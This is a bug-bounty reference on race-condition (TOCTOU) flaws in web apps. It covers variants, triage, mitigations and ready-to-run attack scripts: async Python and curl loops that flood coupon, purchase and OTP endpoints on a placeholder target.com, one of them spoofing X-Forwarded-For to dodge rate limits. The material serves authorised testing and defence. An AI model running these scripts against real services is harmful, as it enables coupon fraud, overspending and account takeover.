# RACE CONDITIONS (TOCTOU) — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Sections 5 & 6), telegram-intel, github-x-intel (H1 reports), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Identify ALL state-changing endpoints (balance, coupon, inventory, limits, auth)
[ ] 2. Test classic double-spend (concurrent deduct from same balance)
[ ] 3. Test limit bypass (folder creation, workspace, rate limits, reservations)
[ ] 4. Test auth race (OTP verification, password reset, session creation)
[ ] 4. Use Turbo Intruder (last-byte sync) or async Python (20-50 concurrent)
[ ] 5. Verify impact: financial loss, limit bypass, auth bypass = Critical
```

---

## CORE CONCEPTS

### TOCTOU (Time-of-Check to Time-of-Use)
```
VULNERABLE:
balance = get_balance(user_id)      # CHECK
if balance >= amount:
    deduct(user_id, amount)         # USE — gap here!

SECURE (Atomic):
rows = db.execute("UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?",
                  amount, user_id, amount)
if rows == 0: raise InsufficientBalance()
```

### Why It Works
- Check and Use are separate operations
- Between them, another thread can modify state
- Database default isolation (READ COMMITTED) allows this

---

## RACE CONDITION VARIANTS

### 1. Classic Double-Spend (Balance/Credit)
```
Thread A: GET balance=100 → check 100>=50 → PASS
Thread B: GET balance=100 → check 100>=50 → PASS
Thread A: deduct 50 → balance=50
Thread B: deduct 50 → balance=0 (should be -50!)
```

### 2. Coupon/Promo Redemption
```
Thread A: check coupon.valid && !coupon.used → PASS
Thread B: check coupon.valid && !coupon.used → PASS
Thread A: mark coupon.used=true
Thread B: mark coupon.used=true → BOTH succeed!
```

### 3. Limit Bypass (Folder/Workspace/Rate Limits) — H1 Reports
```
Thread A: count_folders(user)=4 → check <5 → PASS
Thread B: count_folders(user)=4 → check <5 → PASS
Thread A: create folder → count=5
Thread B: create folder → count=6 (bypassed limit!)
```
**H1 Reports**: Dust ($), SingleStore ($), Lichess (rate limit)

### 4. Inventory Overselling
```
Thread A: stock=1 → check stock>0 → PASS
Thread B: stock=1 → check stock>0 → PASS
Thread A: stock=0
Thread B: stock=-1 (oversold!)
```

### 5. Auth Race Conditions
```
OTP Verification:
Thread A: verify OTP "123456" → check valid → PASS
Thread B: verify OTP "123456" → check valid → PASS
Both succeed → OTP reused!

Password Reset:
Thread A: request reset for victim → token generated
Thread B: request reset for victim → token generated
Thread A: use token → success
Thread B: use token → success (if not invalidated)

Session Creation:
Thread A: login → create session
Thread B: login → create session
Both get valid sessions → session fixation potential
```

### 6. Reservation/Booking
```
Thread A: check availability → PASS
Thread B: check availability → PASS
Thread A: reserve slot
Thread B: reserve same slot → double booking
```

### 7. Gift Card / Credit Transfer
```
Thread A: check balance=100 → transfer 100 → PASS
Thread B: check balance=100 → transfer 100 → PASS
Both complete → 200 transferred from 100 balance
```

### 8. Referral/Invite Loops
```
Thread A: invite user B → check not_invited → PASS
Thread B: invite user A → check not_invited → PASS
Both get referral bonus
```

---

## TESTING METHODOLOGY

### Phase 1: Identify Target Endpoints
```bash
# State-changing endpoints to prioritize:
# - Balance/credit operations (transfer, spend, redeem)
# - Limit enforcement (create, reserve, register)
# - Auth flows (OTP, reset, login, session)
# - Inventory (purchase, reserve, release)
# - Coupon/loyalty (redeem, earn, transfer)
```

### Phase 2: Turbo Intruder (Burp) — Last-Byte Sync
```
1. Send request to Turbo Intruder
2. Set "Concurrent connections" = 20-50
3. Enable "Last-byte synchronization"
4. Use "race" engine
5. Monitor for 200/201 vs 400/409/429
```

### Phase 3: Async Python (Custom)
```python
import asyncio, aiohttp

async def race_endpoint(session, payload, headers):
    async with session.post("https://target.com/api/endpoint",
                            json=payload, headers=headers) as r:
        return r.status, await r.text()

async def run_race(endpoint, payload, headers, concurrency=30):
    async with aiohttp.ClientSession() as s:
        tasks = [race_endpoint(s, payload, headers) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
        for status, text in results:
            print(f"Status: {status}, Len: {len(text)}")
            if "error" not in text.lower() and status == 200:
                print("POTENTIAL RACE SUCCESS!")

# Usage:
# asyncio.run(run_race("/api/redeem", {"code": "COUPON123"}, {"Authorization": "Bearer TOKEN"}))
```

### Phase 4: Single-Packet Attack (HTTP/2)
```bash
# HTTP/2 multiplexing allows true single-packet race
# Use h2c or HTTP/2 capable tools
# Single TCP packet with multiple HEADERS frames
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Variant |
|--------|-------|---------|---------|
| **—** | Race Condition in Folder Creation Allows Bypassing Folder Limit | Dust | Limit bypass |
| **—** | Exceeding the limit of Workspaces via Race Condition | SingleStore | Limit bypass |
| **—** | Improper Authentication Throttling Allows Attacker-Controlled Acc | Lichess | Rate limit |
| **—** | Race condition on add 1 free domain | Automattic | Coupon/limit |
| **—** | Race Condition in HTTP/2 Connection Reuse | curl | Protocol |
| **—** | TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certifi | curl | Protocol |
| **—** | Race Condition in Folder Creation | Dust | Limit bypass |

---

## CHAINS THAT PAY

```
Race + Double Spend (credits, gift cards)           → High/Critical
Race + Limit Bypass (folder, workspace, API calls)  → High/Critical
Race + Coupon Redemption (unlimited coupons)        → High
Race + OTP Verification (reuse same OTP)            → Critical (ATO)
Race + Password Reset Token (reuse token)           → Critical (ATO)
Race + Inventory Overselling                        → High (Financial)
Race + Referral Bonus (double bonus)                → Medium
Race + Session Creation (fixation)                  → High
Race + HTTP/2 Connection Reuse (cert confusion)     → Critical
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Turbo Intruder style with ffuf (basic)
for i in {1..30}; do
  curl -X POST "https://target.com/api/redeem" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"code":"COUPON123"}' -w "%{http_code} " &
done
wait
echo ""

# Async Python race (20 concurrent)
python3 -c "
import asyncio, aiohttp, sys
async def race():
    async with aiohttp.ClientSession() as s:
        tasks = [s.post('https://target.com/api/endpoint',
                       json={'code':'COUPON123'},
                       headers={'Authorization': 'Bearer TOKEN'})
                 for _ in range(30)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if hasattr(r, 'status'):
                print(r.status, end=' ')
            else:
                print('ERR', end=' ')
        print()
asyncio.run(race())
"

# Single-packet HTTP/2 race (requires h2c support)
# h2load -n 30 -c 1 -m POST /api/endpoint https://target.com

# Rate limit race
for i in {1..50}; do
  curl -H "X-Forwarded-For: 1.2.3.$i" \
    "https://target.com/api/verify-otp" \
    -X POST -d '{"otp":"123456"}' -w "%{http_code} " &
done
wait
echo ""

# Inventory race
for i in {1..20}; do
  curl -X POST "https://target.com/api/purchase" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"item_id": 123}' -w "%{http_code} " &
done
wait
echo ""
```

---

## DETECTION SIGNALS

| Signal | Meaning |
|--------|---------|
| Multiple 200/201 for same unique operation | Race success |
| Negative balance / count after test | Double spend |
| Limit exceeded (folders > max, workspaces > max) | Limit bypass |
| Same OTP accepted twice | Auth race |
| Two sessions created for same login | Session race |
| Duplicate records with same unique constraint | DB race |
| `Integrity constraint violation` errors (some succeed) | Partial race |

---

## MITIGATION PATTERNS (For Verification)

```sql
-- Atomic UPDATE with condition (best)
UPDATE balances SET amount = amount - 50 WHERE user_id = 1 AND amount >= 50;
-- Check rows_affected == 1

-- SELECT FOR UPDATE (pessimistic locking)
BEGIN;
SELECT * FROM balances WHERE user_id = 1 FOR UPDATE;
-- check balance, then UPDATE
COMMIT;

-- Optimistic locking (version column)
UPDATE balances SET amount = amount - 50, version = version + 1
WHERE user_id = 1 AND version = 5 AND amount >= 50;

-- Redis Lua script (atomic)
EVAL "if redis.call('get', KEYS[1]) >= ARGV[1] then return redis.call('decrby', KEYS[1], ARGV[1]) else return 0 end" 1 balance 50
```

---

## TRIAGE DECISION TREE

```
1. Can you trigger concurrent execution?
   NO → Not testable (or need better tooling)
   YES → Continue

2. Does state change incorrectly?
   - Negative balance / overspend           → Critical
   - Limit exceeded (folders, workspaces)   → High/Critical
   - Coupon used multiple times             → High
   - OTP/token reused                       → Critical (ATO)
   - Duplicate records created              → High

3. Business impact?
   - Financial loss (credits, money)        → Critical
   - ATO via auth race                      → Critical
   - Privilege escalation (limit bypass)    → Critical
   - Resource exhaustion                    → Medium/High
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Race requires 1000+ concurrent (unrealistic) | Not practical = N/A |
| Race only works with artificial delay | Not real-world = N/A |
| DB returns error but no state change | Not vulnerable = N/A |
| "Could race if..." without demonstration | Theoretical = N/A |
| Race on read-only endpoint | No impact = N/A |
| Single-threaded app (no concurrency) | Not applicable = N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `Turbo Intruder` (Burp) | Last-byte sync, high concurrency |
| `race-the-web` | HTTP race condition framework |
| `aiohttp` + `asyncio` | Custom Python race scripts |
| `h2load` | HTTP/2 multiplexing race |
| `wrk` / `hey` | High-concurrency load testing |
| `ffuf` | Basic concurrent testing |
| `nuclei` templates | Race condition templates |
| Custom scripts | Targeted async testing |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 5 (Pattern 4), Section 6 (Classic Double-Spend, Testing, Race Targets)
- telegram-intel: @bugbountyusa tips #85; @bugbountyresources 100 vuln categories
- github-x-intel: H1 reports (Dust, SingleStore, Lichess, Automattic, curl)
- bountyforge: Race conditions as under-hunted class, ATO chains
- bb-methodology: What-If experiments (coupon race), Tactical Thinking
- PortSwigger: Race condition labs, Turbo Intruder guide
- HackTricks: Race condition methodology
- James Kettle: "Race Conditions in Web Applications" (PortSwigger Research)